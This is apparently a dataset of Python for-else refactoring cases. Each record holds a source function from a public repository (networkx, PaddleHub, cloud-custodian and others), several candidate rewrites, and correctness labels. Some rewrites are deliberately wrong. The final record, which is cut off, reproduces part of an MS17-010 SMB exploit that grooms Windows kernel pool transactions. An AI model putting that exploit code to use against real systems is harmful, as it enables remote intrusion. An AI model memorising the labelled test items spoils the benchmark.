    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
CLUENER2020,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/CLUENER2020/pytorch_version/models/transformers/tokenization_albert.py,https://github.com/CLUEbenchmark/CLUENER2020/tree/master/pytorch_version/models/transformers/tokenization_albert.py,WordpieceTokenizer,tokenize$265,"def tokenize(self, text):
      """"""Tokenizes a piece of text into its word pieces.

      This uses a greedy longest-match-first algorithm to perform tokenization
      using the given vocabulary.

      For example:
        input = ""unaffable""
        output = [""un"", ""##aff"", ""##able""]

      Args:
        text: A single token or whitespace separated tokens. This should have
          already been passed through `BasicTokenizer`.

      Returns:
        A list of wordpiece tokens.
      """"""

      output_tokens = []
      for token in whitespace_tokenize(text):
        chars = list(token)
        if len(chars) > self.max_input_chars_per_word:
          output_tokens.append(self.unk_token)
          continue

        is_bad = False
        start = 0
        sub_tokens = []
        while start < len(chars):
          end = len(chars)
          cur_substr = None
          while start < end:
            substr = """".join(chars[start:end])
            if start > 0:
              substr = ""##"" + substr
            if substr in self.vocab:
              cur_substr = substr
              break
            end -= 1
          if cur_substr is None:
            is_bad = True
            break
          sub_tokens.append(cur_substr)
          start = end

        if is_bad:
          output_tokens.append(self.unk_token)
        else:
          output_tokens.extend(sub_tokens)
      return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
pyclustering,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyclustering/pyclustering/nnet/sync.py,https://github.com/annoviko/pyclustering/tree/master/pyclustering/nnet/sync.py,sync_dynamic,allocate_sync_ensembles$174,"def allocate_sync_ensembles(self, tolerance=0.01, indexes=None, iteration=None):
        """"""!
        @brief Allocate clusters in line with ensembles of synchronous oscillators where each synchronous ensemble corresponds to only one cluster.
               
        @param[in] tolerance (double): Maximum error for allocation of synchronous ensemble oscillators.
        @param[in] indexes (list): List of real object indexes and it should be equal to amount of oscillators (in case of 'None' - indexes are in range [0; amount_oscillators]).
        @param[in] iteration (uint): Iteration of simulation that should be used for allocation.
        
        @return (list) Groups (lists) of indexes of synchronous oscillators.
                For example [ [index_osc1, index_osc3], [index_osc2], [index_osc4, index_osc5] ].
        
        """"""

        if self._ccore_sync_dynamic_pointer is not None:
            ensembles = wrapper.sync_dynamic_allocate_sync_ensembles(self._ccore_sync_dynamic_pointer, tolerance, iteration)

            if indexes is not None:
                for ensemble in ensembles:
                    for index in range(len(ensemble)):
                        ensemble[index] = indexes[ensemble[index]]

            return ensembles

        if (self._dynamic is None) or (len(self._dynamic) == 0):
            return []

        number_oscillators = len(self._dynamic[0])
        last_state = None

        if iteration is None:
            last_state = self._dynamic[len(self._dynamic) - 1]
        else:
            last_state = self._dynamic[iteration]

        clusters = []
        if number_oscillators > 0:
            clusters.append([0])

        for i in range(1, number_oscillators, 1):
            cluster_allocated = False
            for cluster in clusters:
                for neuron_index in cluster:
                    last_state_shifted = abs(last_state[i] - 2 * pi)

                    if ( ( (last_state[i] < (last_state[neuron_index] + tolerance)) and (last_state[i] > (last_state[neuron_index] - tolerance)) ) or
                         ( (last_state_shifted < (last_state[neuron_index] + tolerance)) and (last_state_shifted > (last_state[neuron_index] - tolerance)) ) ):
                        cluster_allocated = True

                        real_index = i
                        if indexes is not None:
                            real_index = indexes[i]

                        cluster.append(real_index)
                        break

                if cluster_allocated is True:
                    break

            if cluster_allocated is False:
                clusters.append([i])

        return clusters","for cluster in clusters:
    for neuron_index in cluster:
        last_state_shifted = abs(last_state[i] - 2 * pi)
        if last_state[i] < last_state[neuron_index] + tolerance and last_state[i] > last_state[neuron_index] - tolerance or (last_state_shifted < last_state[neuron_index] + tolerance and last_state_shifted > last_state[neuron_index] - tolerance):
            cluster_allocated = True
            real_index = i
            if indexes is not None:
                real_index = indexes[i]
            cluster.append(real_index)
            break
    if cluster_allocated is True:
        break
if cluster_allocated is False:
    clusters.append([i])","for cluster in clusters:
    for neuron_index in cluster:
        last_state_shifted = abs(last_state[i] - 2 * pi)
        if last_state[i] < last_state[neuron_index] + tolerance and last_state[i] > last_state[neuron_index] - tolerance or (last_state_shifted < last_state[neuron_index] + tolerance and last_state_shifted > last_state[neuron_index] - tolerance):
            cluster_allocated = True
            real_index = i
            if indexes is not None:
                real_index = indexes[i]
            cluster.append(real_index)
            break
    if cluster_allocated is True:
        break
else:
    clusters.append([i])","for cluster in clusters:
    for neuron_index in cluster:
        last_state_shifted = abs(last_state[i] - 2 * pi)
        if last_state[i] < last_state[neuron_index] + tolerance and last_state[i] > last_state[neuron_index] - tolerance or (last_state_shifted < last_state[neuron_index] + tolerance and last_state_shifted > last_state[neuron_index] - tolerance):
            cluster_allocated = True
            real_index = i
            if indexes is not None:
                real_index = indexes[i]
            cluster.append(real_index)
            break
    if cluster_allocated is True:
        break
else:
    clusters.append([i])",1,"for cluster in clusters:
    for neuron_index in cluster:
        last_state_shifted = abs(last_state[i] - 2 * pi)
        if last_state[i] < last_state[neuron_index] + tolerance and last_state[i] > last_state[neuron_index] - tolerance or (last_state_shifted < last_state[neuron_index] + tolerance and last_state_shifted > last_state[neuron_index] - tolerance):
            cluster_allocated = True
            real_index = i
            if indexes is not None:
                real_index = indexes[i]
            cluster.append(real_index)
            break
    if cluster_allocated is True:
        break
if cluster_allocated is False:
    clusters.append([i])","break statement is executed:None
break statement is not executed:zejun1"
pyclustering,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyclustering/pyclustering/nnet/sync.py,https://github.com/annoviko/pyclustering/tree/master/pyclustering/nnet/sync.py,sync_dynamic,allocate_sync_ensembles$174,"def allocate_sync_ensembles(self, tolerance=0.01, indexes=None, iteration=None):
        """"""!
        @brief Allocate clusters in line with ensembles of synchronous oscillators where each synchronous ensemble corresponds to only one cluster.
               
        @param[in] tolerance (double): Maximum error for allocation of synchronous ensemble oscillators.
        @param[in] indexes (list): List of real object indexes and it should be equal to amount of oscillators (in case of 'None' - indexes are in range [0; amount_oscillators]).
        @param[in] iteration (uint): Iteration of simulation that should be used for allocation.
        
        @return (list) Groups (lists) of indexes of synchronous oscillators.
                For example [ [index_osc1, index_osc3], [index_osc2], [index_osc4, index_osc5] ].
        
        """"""

        if self._ccore_sync_dynamic_pointer is not None:
            ensembles = wrapper.sync_dynamic_allocate_sync_ensembles(self._ccore_sync_dynamic_pointer, tolerance, iteration)

            if indexes is not None:
                for ensemble in ensembles:
                    for index in range(len(ensemble)):
                        ensemble[index] = indexes[ensemble[index]]

            return ensembles

        if (self._dynamic is None) or (len(self._dynamic) == 0):
            return []

        number_oscillators = len(self._dynamic[0])
        last_state = None

        if iteration is None:
            last_state = self._dynamic[len(self._dynamic) - 1]
        else:
            last_state = self._dynamic[iteration]

        clusters = []
        if number_oscillators > 0:
            clusters.append([0])

        for i in range(1, number_oscillators, 1):
            cluster_allocated = False
            for cluster in clusters:
                for neuron_index in cluster:
                    last_state_shifted = abs(last_state[i] - 2 * pi)

                    if ( ( (last_state[i] < (last_state[neuron_index] + tolerance)) and (last_state[i] > (last_state[neuron_index] - tolerance)) ) or
                         ( (last_state_shifted < (last_state[neuron_index] + tolerance)) and (last_state_shifted > (last_state[neuron_index] - tolerance)) ) ):
                        cluster_allocated = True

                        real_index = i
                        if indexes is not None:
                            real_index = indexes[i]

                        cluster.append(real_index)
                        break

                if cluster_allocated is True:
                    break

            if cluster_allocated is False:
                clusters.append([i])

        return clusters","for neuron_index in cluster:
    last_state_shifted = abs(last_state[i] - 2 * pi)
    if last_state[i] < last_state[neuron_index] + tolerance and last_state[i] > last_state[neuron_index] - tolerance or (last_state_shifted < last_state[neuron_index] + tolerance and last_state_shifted > last_state[neuron_index] - tolerance):
        cluster_allocated = True
        real_index = i
        if indexes is not None:
            real_index = indexes[i]
        cluster.append(real_index)
        break
if cluster_allocated is True:
    break","for neuron_index in cluster:
    last_state_shifted = abs(last_state[i] - 2 * pi)
    if last_state[i] < last_state[neuron_index] + tolerance and last_state[i] > last_state[neuron_index] - tolerance or (last_state_shifted < last_state[neuron_index] + tolerance and last_state_shifted > last_state[neuron_index] - tolerance):
        cluster_allocated = True
        real_index = i
        if indexes is not None:
            real_index = indexes[i]
        cluster.append(real_index)
        break
else:
    break",Cannot refactor,-1,"for neuron_index in cluster:
    last_state_shifted = abs(last_state[i] - 2 * pi)
    if last_state[i] < last_state[neuron_index] + tolerance and last_state[i] > last_state[neuron_index] - tolerance or (last_state_shifted < last_state[neuron_index] + tolerance and last_state_shifted > last_state[neuron_index] - tolerance):
        cluster_allocated = True
        real_index = i
        if indexes is not None:
            real_index = indexes[i]
        cluster.append(real_index)
        break
if cluster_allocated is True:
    break","break statement is executed:None
break statement is not executed:zejun1"
cloud-custodian,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/cloud-custodian/c7n/resources/appelb.py,https://github.com/cloud-custodian/cloud-custodian/tree/master/c7n/resources/appelb.py,SetWaf,validate$254,"def validate(self):
        found = False
        for f in self.manager.iter_filters():
            if isinstance(f, WafEnabled):
                found = True
                break
        if not found:
            # try to ensure idempotent usage
            raise PolicyValidationError(
                ""set-waf should be used in conjunction with waf-enabled filter on %s"" % (
                    self.manager.data,))
        return self","for f in self.manager.iter_filters():
    if isinstance(f, WafEnabled):
        found = True
        break
if not found:
    raise PolicyValidationError('set-waf should be used in conjunction with waf-enabled filter on %s' % (self.manager.data,))","for f in self.manager.iter_filters():
    if isinstance(f, WafEnabled):
        break
else:
    raise PolicyValidationError('set-waf should be used in conjunction with waf-enabled filter on %s' % (self.manager.data,))","for f in self.manager.iter_filters():
    if isinstance(f, WafEnabled):
        break
else:
    raise PolicyValidationError('set-waf should be used in conjunction with waf-enabled filter on %s' % (self.manager.data,))",1,"for f in self.manager.iter_filters():
    if isinstance(f, WafEnabled):
        found = True
        break
if not found:
    raise PolicyValidationError('set-waf should be used in conjunction with waf-enabled filter on %s' % (self.manager.data,))","break statement is executed:None
break statement is not executed:zejun1"
PaddleHub,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PaddleHub/paddlehub/compat/task/tokenization.py,https://github.com/PaddlePaddle/PaddleHub/tree/master/paddlehub/compat/task/tokenization.py,WSSPTokenizer,cut$117,"def cut(self, chars: List) -> List:
        words = []
        idx = 0
        while idx < len(chars):
            matched = False
            for i in range(self.window_size, 0, -1):
                cand = chars[idx:idx + i]
                if cand in self.dict:
                    words.append(cand)
                    matched = True
                    break
            if not matched:
                i = 1
                words.append(chars[idx])
            idx += i
        return words","for i in range(self.window_size, 0, -1):
    cand = chars[idx:idx + i]
    if cand in self.dict:
        words.append(cand)
        matched = True
        break
if not matched:
    i = 1
    words.append(chars[idx])","for i in range(self.window_size, 0, -1):
    cand = chars[idx:idx + i]
    if cand in self.dict:
        words.append(cand)
        break
else:
    i = 1
    words.append(chars[idx])","for i in range(self.window_size, 0, -1):
    cand = chars[idx:idx + i]
    if cand in self.dict:
        words.append(cand)
        break
else:
    i = 1
    words.append(chars[idx])",1,"for i in range(self.window_size, 0, -1):
    cand = chars[idx:idx + i]
    if cand in self.dict:
        words.append(cand)
        matched = True
        break
if not matched:
    i = 1
    words.append(chars[idx])","break statement is executed:None
break statement is not executed:zejun1"
networkx,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/networkx/networkx/algorithms/components/strongly_connected.py,https://github.com/networkx/networkx/tree/master/networkx/algorithms/components/strongly_connected.py,,strongly_connected_components$16,"def strongly_connected_components(G):
    """"""Generate nodes in strongly connected components of graph.

    Parameters
    ----------
    G : NetworkX Graph
        A directed graph.

    Returns
    -------
    comp : generator of sets
        A generator of sets of nodes, one for each strongly connected
        component of G.

    Raises
    ------
    NetworkXNotImplemented
        If G is undirected.

    Examples
    --------
    Generate a sorted list of strongly connected components, largest first.

    >>> G = nx.cycle_graph(4, create_using=nx.DiGraph())
    >>> nx.add_cycle(G, [10, 11, 12])
    >>> [
    ...     len(c)
    ...     for c in sorted(nx.strongly_connected_components(G), key=len, reverse=True)
    ... ]
    [4, 3]

    If you only want the largest component, it's more efficient to
    use max instead of sort.

    >>> largest = max(nx.strongly_connected_components(G), key=len)

    See Also
    --------
    connected_components
    weakly_connected_components
    kosaraju_strongly_connected_components

    Notes
    -----
    Uses Tarjan's algorithm[1]_ with Nuutila's modifications[2]_.
    Nonrecursive version of algorithm.

    References
    ----------
    .. [1] Depth-first search and linear graph algorithms, R. Tarjan
       SIAM Journal of Computing 1(2):146-160, (1972).

    .. [2] On finding the strongly connected components in a directed graph.
       E. Nuutila and E. Soisalon-Soinen
       Information Processing Letters 49(1): 9-14, (1994)..

    """"""
    preorder = {}
    lowlink = {}
    scc_found = set()
    scc_queue = []
    i = 0  # Preorder counter
    for source in G:
        if source not in scc_found:
            queue = [source]
            while queue:
                v = queue[-1]
                if v not in preorder:
                    i = i + 1
                    preorder[v] = i
                done = True
                for w in G[v]:
                    if w not in preorder:
                        queue.append(w)
                        done = False
                        break
                if done:
                    lowlink[v] = preorder[v]
                    for w in G[v]:
                        if w not in scc_found:
                            if preorder[w] > preorder[v]:
                                lowlink[v] = min([lowlink[v], lowlink[w]])
                            else:
                                lowlink[v] = min([lowlink[v], preorder[w]])
                    queue.pop()
                    if lowlink[v] == preorder[v]:
                        scc = {v}
                        while scc_queue and preorder[scc_queue[-1]] > preorder[v]:
                            k = scc_queue.pop()
                            scc.add(k)
                        scc_found.update(scc)
                        yield scc
                    else:
                        scc_queue.append(v)","for w in G[v]:
    if w not in preorder:
        queue.append(w)
        done = False
        break
if done:
    lowlink[v] = preorder[v]
    for w in G[v]:
        if w not in scc_found:
            if preorder[w] > preorder[v]:
                lowlink[v] = min([lowlink[v], lowlink[w]])
            else:
                lowlink[v] = min([lowlink[v], preorder[w]])
    queue.pop()
    if lowlink[v] == preorder[v]:
        scc = {v}
        while scc_queue and preorder[scc_queue[-1]] > preorder[v]:
            k = scc_queue.pop()
            scc.add(k)
        scc_found.update(scc)
        yield scc
    else:
        scc_queue.append(v)","for w in G[v]:
    if w not in preorder:
        queue.append(w)
        break
else:
    lowlink[v] = preorder[v]
    for w in G[v]:
        if w not in scc_found:
            if preorder[w] > preorder[v]:
                lowlink[v] = min([lowlink[v], lowlink[w]])
            else:
                lowlink[v] = min([lowlink[v], preorder[w]])
    queue.pop()
    if lowlink[v] == preorder[v]:
        scc = {v}
        while scc_queue and preorder[scc_queue[-1]] > preorder[v]:
            k = scc_queue.pop()
            scc.add(k)
        scc_found.update(scc)
        yield scc
    else:
        scc_queue.append(v)","for w in G[v]:
    if w not in preorder:
        queue.append(w)
        break
else:
    lowlink[v] = preorder[v]
    for w in G[v]:
        if w not in scc_found:
            if preorder[w] > preorder[v]:
                lowlink[v] = min([lowlink[v], lowlink[w]])
            else:
                lowlink[v] = min([lowlink[v], preorder[w]])
    queue.pop()
    if lowlink[v] == preorder[v]:
        scc = {v}
        while scc_queue and preorder[scc_queue[-1]] > preorder[v]:
            k = scc_queue.pop()
            scc.add(k)
        scc_found.update(scc)
        yield scc
    else:
        scc_queue.append(v)",1,"for w in G[v]:
    if w not in preorder:
        queue.append(w)
        done = False
        break
if done:
    lowlink[v] = preorder[v]
    for w in G[v]:
        if w not in scc_found:
            if preorder[w] > preorder[v]:
                lowlink[v] = min([lowlink[v], lowlink[w]])
            else:
                lowlink[v] = min([lowlink[v], preorder[w]])
    queue.pop()
    if lowlink[v] == preorder[v]:
        scc = {v}
        while scc_queue and preorder[scc_queue[-1]] > preorder[v]:
            k = scc_queue.pop()
            scc.add(k)
        scc_found.update(scc)
        yield scc
    else:
        scc_queue.append(v)","break statement is executed:None
break statement is not executed:zejun1"
cloud-custodian,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/cloud-custodian/c7n/resources/s3.py,https://github.com/cloud-custodian/cloud-custodian/tree/master/c7n/resources/s3.py,EncryptionEnabledFilter,process_bucket$927,"def process_bucket(self, b):
        p = b.get('Policy')
        if p is None:
            return b
        p = json.loads(p)
        encryption_statement = dict(ENCRYPTION_STATEMENT_GLOB)

        statements = p.get('Statement', [])
        check = False
        for s in list(statements):
            if 'Sid' in s:
                encryption_statement[""Sid""] = s[""Sid""]
            if 'Resource' in s:
                encryption_statement[""Resource""] = s[""Resource""]
            if s == encryption_statement:
                check = True
                break
        if check:
            return None
        else:
            return b","for s in list(statements):
    if 'Sid' in s:
        encryption_statement['Sid'] = s['Sid']
    if 'Resource' in s:
        encryption_statement['Resource'] = s['Resource']
    if s == encryption_statement:
        check = True
        break
if check:
    return None
else:
    return b","for s in list(statements):
    if 'Sid' in s:
        encryption_statement['Sid'] = s['Sid']
    if 'Resource' in s:
        encryption_statement['Resource'] = s['Resource']
    if s == encryption_statement:
        return b
        break
else:
    return None","for s in list(statements):
    if 'Sid' in s:
        encryption_statement['Sid'] = s['Sid']
    if 'Resource' in s:
        encryption_statement['Resource'] = s['Resource']
    if s == encryption_statement:
        return None
        break
else:
    return b",0,"for s in list(statements):
    if 'Sid' in s:
        encryption_statement['Sid'] = s['Sid']
    if 'Resource' in s:
        encryption_statement['Resource'] = s['Resource']
    if s == encryption_statement:
        check = True
        break
if check:
    return None
else:
    return b","break statement is executed:None
break statement is not executed:zejun1"
Paddle,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Paddle/python/paddle/fluid/reader.py,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/fluid/reader.py,GeneratorLoader,set_sample_generator$1560,"def set_sample_generator(
        self, reader, batch_size, drop_last=True, places=None
    ):
        assert batch_size > 0, ""batch_size must be larger than 0""
        if isinstance(places, (list, tuple)):
            places = _get_paddle_place_list(places)
        else:
            places = _get_paddle_place(places)
        has_lod = False
        for f in self._feed_list:
            if f.lod_level != 0:
                has_lod = True
                break

        if has_lod:
            self.set_sample_list_generator(
                paddle.batch(
                    reader, batch_size=batch_size, drop_last=drop_last
                ),
                places=places,
            )
        else:
            reader = BatchedTensorProvider(
                feed_list=self._feed_list,
                place=core.CPUPlace(),
                batch_size=batch_size,
                generator=reader,
                drop_last=drop_last,
            )
            self.set_batch_generator(reader, places=places)
        return self","for f in self._feed_list:
    if f.lod_level != 0:
        has_lod = True
        break
if has_lod:
    self.set_sample_list_generator(paddle.batch(reader, batch_size=batch_size, drop_last=drop_last), places=places)
else:
    reader = BatchedTensorProvider(feed_list=self._feed_list, place=core.CPUPlace(), batch_size=batch_size, generator=reader, drop_last=drop_last)
    self.set_batch_generator(reader, places=places)","for f in self._feed_list:
    if f.lod_level != 0:
        reader = BatchedTensorProvider(feed_list=self._feed_list, place=core.CPUPlace(), batch_size=batch_size, generator=reader, drop_last=drop_last)
        self.set_batch_generator(reader, places=places)
        break
else:
    self.set_sample_list_generator(paddle.batch(reader, batch_size=batch_size, drop_last=drop_last), places=places)","for f in self._feed_list:
    if f.lod_level != 0:
        self.set_sample_list_generator(paddle.batch(reader, batch_size=batch_size, drop_last=drop_last), places=places)
        break
else:
    reader = BatchedTensorProvider(feed_list=self._feed_list, place=core.CPUPlace(), batch_size=batch_size, generator=reader, drop_last=drop_last)
    self.set_batch_generator(reader, places=places)",0,"for f in self._feed_list:
    if f.lod_level != 0:
        has_lod = True
        break
if has_lod:
    self.set_sample_list_generator(paddle.batch(reader, batch_size=batch_size, drop_last=drop_last), places=places)
else:
    reader = BatchedTensorProvider(feed_list=self._feed_list, place=core.CPUPlace(), batch_size=batch_size, generator=reader, drop_last=drop_last)
    self.set_batch_generator(reader, places=places)","break statement is executed:None
break statement is not executed:zejun1"
frappe,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/frappe/frappe/core/doctype/doctype/doctype.py,https://github.com/frappe/frappe/tree/master/frappe/core/doctype/doctype/doctype.py,,check_level_zero_is_set$1555,"def check_level_zero_is_set(d):
		if cint(d.permlevel) > 0 and d.role != ""All"":
			has_zero_perm = False
			for p in permissions:
				if p.role == d.role and (p.permlevel or 0) == 0 and p != d:
					has_zero_perm = True
					break

			if not has_zero_perm:
				frappe.throw(
					_(""{0}: Permission at level 0 must be set before higher levels are set"").format(get_txt(d))
				)

			for invalid in (""create"", ""submit"", ""cancel"", ""amend""):
				if d.get(invalid):
					d.set(invalid, 0)","for p in permissions:
    if p.role == d.role and (p.permlevel or 0) == 0 and (p != d):
        has_zero_perm = True
        break
if not has_zero_perm:
    frappe.throw(_('{0}: Permission at level 0 must be set before higher levels are set').format(get_txt(d)))","for p in permissions:
    if p.role == d.role and (p.permlevel or 0) == 0 and (p != d):
        break
else:
    frappe.throw(_('{0}: Permission at level 0 must be set before higher levels are set').format(get_txt(d)))","for p in permissions:
    if p.role == d.role and (p.permlevel or 0) == 0 and (p != d):
        break
else:
    frappe.throw(_('{0}: Permission at level 0 must be set before higher levels are set').format(get_txt(d)))",1,"for p in permissions:
    if p.role == d.role and (p.permlevel or 0) == 0 and (p != d):
        has_zero_perm = True
        break
if not has_zero_perm:
    frappe.throw(_('{0}: Permission at level 0 must be set before higher levels are set').format(get_txt(d)))","break statement is executed:None
break statement is not executed:zejun1"
mypaint,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mypaint/gui/windowing.py,https://github.com/mypaint/mypaint/tree/master/gui/windowing.py,,set_initial_window_position$685,"def set_initial_window_position(win, pos):
    """"""Set the position of a Gtk.Window, used during initial positioning.

    This is used both for restoring a saved window position, and for the
    application-wide defaults. The ``pos`` argument is a dict containing the
    following optional keys

        ""w"": <int>
        ""h"": <int>
            If positive, the size of the window.
            If negative, size is calculated based on the size of the
            monitor with the pointer on it, and x (or y) if given, e.g.

                width = mouse_mon_w -  abs(x) + abs(w)   # or (if no x)
                width = mouse_mon_w - (2 * abs(w))

            The same is true of calculated heights.

        ""x"": <int>
        ""y"": <int>
            If positive, the left/top of the window.
            If negative, the bottom/right of the window on the monitor
            with the pointer on it: you MUST provide a positive w and h
            if you do this.

    If the window's calculated top-left would place it offscreen, it will be
    placed in its default, window manager provided position. If its calculated
    size is larger than the screen, the window will be given its natural size
    instead.

    Returns the final, chosen (x, y) pair for forcing the window position on
    first map, or None if defaults are being used.

    """"""

    min_usable_size = 100

    # Where the mouse is right now - identifies the current monitor.
    ptr_x, ptr_y = 0, 0
    screen = win.get_screen()
    display = win.get_display()
    devmgr = display and display.get_device_manager() or None
    ptrdev = devmgr and devmgr.get_client_pointer() or None
    if ptrdev:
        ptr_screen, ptr_x, ptr_y = ptrdev.get_position()
        assert ptr_screen is screen, (
            ""Screen containing core pointer != screen containing ""
            ""the window for positioning (%r != %r)"" % (ptr_screen, screen)
        )
        logger.debug(""Core pointer position from display: %r"", (ptr_x, ptr_y))
    else:
        logger.warning(
            ""Could not determine core pointer position from display. ""
            ""Using %r instead."",
            (ptr_x, ptr_y),
        )
    screen_w = screen.get_width()
    screen_h = screen.get_height()
    assert screen_w > min_usable_size
    assert screen_h > min_usable_size

    # The target area is ideally the current monitor.
    targ_mon_num = screen.get_monitor_at_point(ptr_x, ptr_y)
    targ_geom = _get_target_area_geometry(screen, targ_mon_num)

    # Positioning arguments
    x, y, w, h = (pos.get(k, None) for k in (""x"", ""y"", ""w"", ""h""))
    final_x, final_y, final_w, final_h = _final_rectangle(
        x, y, w, h, screen_w, screen_h, targ_geom, min_usable_size)

    # If the window is positioned, make sure it's on a monitor which still
    # exists. Users change display layouts...
    if None not in (final_x, final_y):
        onscreen = False
        for mon_num in xrange(screen.get_n_monitors()):
            targ_geom = _get_target_area_geometry(screen, mon_num)
            in_targ_geom = (
                final_x < (targ_geom.x + targ_geom.w)
                and final_y < (targ_geom.x + targ_geom.h)
                and final_x >= targ_geom.x
                and final_y >= targ_geom.y
            )
            if in_targ_geom:
                onscreen = True
                break
        if not onscreen:
            logger.warning(""Calculated window position is offscreen; ""
                           ""ignoring %r"" % ((final_x, final_y), ))
            final_x = None
            final_y = None

    # Attempt to set up with a geometry string first. Repeats the block below
    # really, but this helps smaller windows receive the right position in
    # xfwm (at least), possibly because the right window hints will be set.
    if None not in (final_w, final_h, final_x, final_y):
        geom_str = ""%dx%d+%d+%d"" % (final_w, final_h, final_x, final_y)
        win.connect(""realize"", lambda *a: win.parse_geometry(geom_str))

    # Set what we can now.
    if None not in (final_w, final_h):
        win.set_default_size(final_w, final_h)
    if None not in (final_x, final_y):
        win.move(final_x, final_y)
        return final_x, final_y

    return None","for mon_num in xrange(screen.get_n_monitors()):
    targ_geom = _get_target_area_geometry(screen, mon_num)
    in_targ_geom = final_x < targ_geom.x + targ_geom.w and final_y < targ_geom.x + targ_geom.h and (final_x >= targ_geom.x) and (final_y >= targ_geom.y)
    if in_targ_geom:
        onscreen = True
        break
if not onscreen:
    logger.warning('Calculated window position is offscreen; ignoring %r' % ((final_x, final_y),))
    final_x = None
    final_y = None","for mon_num in xrange(screen.get_n_monitors()):
    targ_geom = _get_target_area_geometry(screen, mon_num)
    in_targ_geom = final_x < targ_geom.x + targ_geom.w and final_y < targ_geom.x + targ_geom.h and (final_x >= targ_geom.x) and (final_y >= targ_geom.y)
    if in_targ_geom:
        break
else:
    logger.warning('Calculated window position is offscreen; ignoring %r' % ((final_x, final_y),))
    final_x = None
    final_y = None","for mon_num in xrange(screen.get_n_monitors()):
    targ_geom = _get_target_area_geometry(screen, mon_num)
    in_targ_geom = final_x < targ_geom.x + targ_geom.w and final_y < targ_geom.x + targ_geom.h and (final_x >= targ_geom.x) and (final_y >= targ_geom.y)
    if in_targ_geom:
        break
else:
    logger.warning('Calculated window position is offscreen; ignoring %r' % ((final_x, final_y),))
    final_x = None
    final_y = None",1,"for mon_num in xrange(screen.get_n_monitors()):
    targ_geom = _get_target_area_geometry(screen, mon_num)
    in_targ_geom = final_x < targ_geom.x + targ_geom.w and final_y < targ_geom.x + targ_geom.h and (final_x >= targ_geom.x) and (final_y >= targ_geom.y)
    if in_targ_geom:
        onscreen = True
        break
if not onscreen:
    logger.warning('Calculated window position is offscreen; ignoring %r' % ((final_x, final_y),))
    final_x = None
    final_y = None","break statement is executed:None
break statement is not executed:zejun1"
MS17-010,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/MS17-010/zzz_exploit.py,https://github.com/worawit/MS17-010/tree/master//zzz_exploit.py,,exploit_fish_barrel$580,"def exploit_fish_barrel(conn, pipe_name, info):
	# for Windows Vista/2008 and earlier
	
	tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
	conn.set_default_tid(tid)
	# fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.
	fid = conn.nt_create_andx(tid, pipe_name)
	info['fid'] = fid

	if info['os'] == 'WIN7' and 'arch' not in info:
		# leak_frag_size() can be used against Windows Vista/2008 to determine target architecture
		info.update(leak_frag_size(conn, tid, fid))
	
	if 'arch' in info:
		# add os and arch specific exploit info
		info.update(OS_ARCH_INFO[info['os']][info['arch']])
		attempt_list = [ OS_ARCH_INFO[info['os']][info['arch']] ]
	else:
		# do not know target architecture
		# this case is only for Windows 2003
		# try offset of 64 bit then 32 bit because no target architecture
		attempt_list = [ OS_ARCH_INFO[info['os']]['x64'], OS_ARCH_INFO[info['os']]['x86'] ]
	
	# ================================
	# groom packets
	# ================================
	# sum of transaction name, parameters and data length is 0x1000
	# paramterCount = 0x100-TRANS_NAME_LEN
	print('Groom packets')
	trans_param = pack('<HH', info['fid'], 0)
	for i in range(12):
		mid = info['fid'] if i == 8 else next_extra_mid()
		conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0, maxParameterCount=0x40, maxDataCount=0)	
	
	# expected transactions alignment
	#
	#    +-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+
	#    |  mid=mid1 |  mid=mid2 |             |  mid=mid8 |  mid=fid  |  mid=mid9 | mid=mid10 | mid=mid11 |
	#    +-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+
	#                                                         trans1       trans2

	# ================================
	# shift transaction Indata ptr with SmbWriteAndX
	# ================================
	shift_indata_byte = 0x200
	conn.do_write_andx_raw_pipe(info['fid'], 'A'*shift_indata_byte)
	
	# ================================
	# Dangerous operation: attempt to control one transaction
	# ================================
	# Note: POOL_ALIGN value is same as heap alignment value
	success = False
	for tinfo in attempt_list:
		print('attempt controlling next transaction on ' + tinfo['ARCH'])
		HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE']+HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
		NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE

		# Below operation is dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.
		conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET+tinfo['TRANS_MID_OFFSET'])
		wait_for_request_processed(conn)

